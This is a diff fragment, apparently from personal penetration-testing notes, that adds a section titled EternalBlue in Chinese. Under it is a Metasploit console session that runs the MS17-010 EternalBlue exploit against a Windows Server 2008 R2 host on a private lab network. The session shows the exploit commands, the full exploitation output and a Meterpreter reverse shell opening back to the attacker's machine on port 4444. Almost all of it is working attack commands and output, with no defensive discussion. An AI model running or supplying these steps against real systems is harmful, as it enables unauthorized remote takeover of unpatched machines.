@@ -40,3 +40,45 @@ set LPORT 4444
 exploit
 
 ```
+
+
+永恒之蓝
+```
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhost 192.168.59.197
+rhost => 192.168.59.197
+msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
+
+[*] Started reverse TCP handler on 192.168.59.55:4444 
+[*] 192.168.59.197:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 192.168.59.197:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Datacenter 7600 x64 (64-bit)
+[*] 192.168.59.197:445    - Scanned 1 of 1 hosts (100% complete)
+[*] 192.168.59.197:445 - Connecting to target for exploitation.
+[+] 192.168.59.197:445 - Connection established for exploitation.
+[+] 192.168.59.197:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 192.168.59.197:445 - CORE raw buffer dump (38 bytes)
+[*] 192.168.59.197:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
+[*] 192.168.59.197:445 - 0x00000010  30 30 38 20 52 32 20 44 61 74 61 63 65 6e 74 65  008 R2 Datacente
+[*] 192.168.59.197:445 - 0x00000020  72 20 37 36 30 30                                r 7600          
+[+] 192.168.59.197:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 192.168.59.197:445 - Trying exploit with 12 Groom Allocations.
+[*] 192.168.59.197:445 - Sending all but last fragment of exploit packet
+[*] 192.168.59.197:445 - Starting non-paged pool grooming
+[+] 192.168.59.197:445 - Sending SMBv2 buffers
+[+] 192.168.59.197:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 192.168.59.197:445 - Sending final SMBv2 buffers.
+[*] 192.168.59.197:445 - Sending last fragment of exploit packet!
+[*] 192.168.59.197:445 - Receiving response from exploit packet
+[+] 192.168.59.197:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 192.168.59.197:445 - Sending egg to corrupted connection.
+[*] 192.168.59.197:445 - Triggering free of corrupted buffer.
+[*] Sending stage (200262 bytes) to 192.168.59.197
+[*] Meterpreter session 1 opened (192.168.59.55:4444 -> 192.168.59.197:49159) at 2020-12-29 01:36:46 -0800
+[+] 192.168.59.197:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 192.168.59.197:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 192.168.59.197:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+meterpreter > 
+
+```
